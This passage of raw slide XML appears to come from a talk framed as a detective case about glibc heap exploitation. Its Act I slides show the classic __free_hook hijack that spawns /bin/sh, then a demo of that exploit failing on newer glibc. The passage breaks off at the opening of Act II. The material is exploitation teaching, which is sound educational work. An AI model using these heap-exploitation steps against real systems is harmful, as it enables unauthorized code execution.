              <a:buSzPts val="21000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="21000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="20242C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT I</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="21000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Google Shape;41;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="233172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484D"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT I</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Google Shape;42;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="111556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5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="5200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The Crime</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="5200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Google Shape;43;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="388620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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>A technique that's already dead.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Google Shape;44;p3"/>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b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>03 / 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49" name="Shape 49"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Google Shape;50;p4"/>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b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039 — ACT I · THE RECIPE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Google Shape;51;p4"/>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b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>04 / 27</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Google Shape;52;p4"/>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i="0" lang="en-US" sz="3400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The finish every tutorial teaches</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Google Shape;53;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1417320"/>
            <a:ext cx="111556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b="0" i="0" lang="en-US" sz="1700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Classic glibc heap pwn ends the same way — hijack an allocator hook:</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Google Shape;54;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2057400"/>
            <a:ext cx="6949440" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1667"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="2203704"/>
            <a:ext cx="6547104" cy="24505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29B"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># leak libc, then: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b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>free_hook = libc.sym['__free_hook']</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b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>write(free_hook, libc.sym['system'])   # arb write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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># put "/bin/sh" in a chunk, free it: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b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>edit(c, b'/bin/sh\0'); free(c)</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__free_hook fires -&gt; system("/bin/sh")</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="Google Shape;56;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7680960" y="2148840"/>
            <a:ext cx="402336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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>One arbitrary write.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="15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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>No ROP, no stack pivot.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="15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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» Works flawlessly… on glibc ≤ 2.33.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Google Shape;57;p4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9997495" y="5925303"/>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62" name="Shape 62"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Google Shape;63;p5"/>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b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039 — ACT I · TIME OF DEATH</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Google Shape;64;p5"/>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b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>05 / 27</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Google Shape;65;p5"/>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5484D"/>
              </a:buClr>
              <a:buSzPts val="3400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>It fails. No shell. No error.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Google Shape;66;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1554480"/>
            <a:ext cx="7040880" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 20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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="1700784"/>
            <a:ext cx="6638544" cy="19933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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ ./exploit_classic.py</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libc leaked</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__free_hook @ 0x7f…148  overwritten -&gt; system</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b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>[*] freeing /bin/sh chunk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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ _        # …nothing. process exits 0.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68" name="Google Shape;68;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3977640"/>
            <a:ext cx="7040880" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 4348"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="4123944"/>
            <a:ext cx="6638544" cy="7589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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ nm -D libc.so.6 | grep __free_hook</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3B341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>000000000021a148 B __free_hook   # still right there</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="70" name="Google Shape;70;p5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="1737360"/>
            <a:ext cx="3840480" cy="2377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2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>You overwrote a</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8EB"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>symbol that's still</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8EB"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>in .bss — and the</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8EB"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>allocator never</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8EB"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>reads it.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="Google Shape;71;p5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="4160520"/>
            <a:ext cx="3840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2000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="2000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Hooks gone.  Now what?</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="72" name="Google Shape;72;p5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10035570" y="5925303"/>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77" name="Shape 77"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Google Shape;78;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1097280"/>
            <a:ext cx="12191695"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42C"/>
              </a:buClr>
              <a:buSzPts val="21000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="21000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="20242C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT II</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="21000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Google Shape;79;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="233172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500"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT II</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="Google Shape;80;p6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
